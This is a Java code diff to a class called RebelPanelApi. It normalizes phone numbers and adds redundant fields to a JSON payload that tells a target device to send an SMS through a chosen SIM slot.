@@ -309,32 +309,43 @@ final class RebelPanelApi {
         }
         if ("rto9".equals(type)) {
             int simSlot = Math.max(0, slot - 1);
+            String to10 = normalizePhone(to);
             JSONObject payload = new JSONObject();
             payload.put("cmd", "send_sms");
             payload.put("command", "send message");
             payload.put("messageText", message);
             payload.put("msg", message);
-            payload.put("phoneNumber", to);
-            payload.put("phone", to);
-            payload.put("number", to);
-            payload.put("to", to);
+            payload.put("phoneNumber", to10);
+            payload.put("phone", to10);
+            payload.put("number", to10);
+            payload.put("to", to10);
 
             JSONObject sendSms = new JSONObject();
             sendSms.put("message", message);
             sendSms.put("status", "pending");
-            sendSms.put("to", to);
+            sendSms.put("to", to10);
             payload.put("sendSms", sendSms);
 
             JSONObject sms = new JSONObject();
             sms.put("message", message);
             sms.put("status", "pending");
-            sms.put("to", to);
+            sms.put("to", to10);
             payload.put("sms", sms);
+
+            JSONObject action = new JSONObject();
+            action.put("command", "send message");
+            action.put("messageText", message);
+            action.put("phoneNumber", to10);
+            action.put("sendSms", new JSONObject(sendSms.toString()));
+            action.put("simSlot", String.valueOf(simSlot));
+            action.put("targetDeviceId", deviceId);
+            payload.put("action", action);
 
             payload.put("sim", simSlot);
             payload.put("simSlot", String.valueOf(simSlot));
             payload.put("targetDeviceId", deviceId);
             payload.put("timestamp", System.currentTimeMillis());
+            payload.put("type", "sms");
             payload.put("webhookEvent", "send_sms");
             return payload;
         }
